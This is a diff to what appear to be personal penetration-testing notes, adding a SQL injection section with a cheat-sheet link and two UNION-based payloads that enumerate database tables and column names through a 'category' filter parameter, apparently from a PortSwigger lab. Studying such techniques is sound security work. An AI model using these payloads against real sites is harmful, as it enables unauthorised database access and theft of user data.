@@ -65,6 +65,8 @@ To automate the process, use the following tools
 -     ssh -p <port> -i <file> root@10.0.2.10
 
 -----------------------------------------------------------------SQL INJECTION-------------------------------------------------------------------------
+- Cheat Sheet
+-     https://portswigger.net/web-security/sql-injection/cheat-sheet
 - where you can find SQL injection:
 - GET REQUEST
 -     http://site.com/index.php?id=1
@@ -80,7 +82,11 @@ To automate the process, use the following tools
 -     '-- - 
 -     ' #
 - find table name from information_schema.tables
+-     /filter?category=Food+%26+Drink'union+select+table_schema,table_name+from+information_schema.tables--+
 -     https://www.sqlinjection.net/table-names/
+- find column name from the table
+-     /filter?category=Pets'union+select+null,column_name+from+information_schema.columns+where+table_name='users_kuqbsq'--%20
+-     https://www.sqlinjection.net/column-names/
 - Blined BOOLEAN SQL INJECTION
 -     SELECT "You are in ..." where id='2' and 'a'='a';
 - Time-Based SQL INJECTION
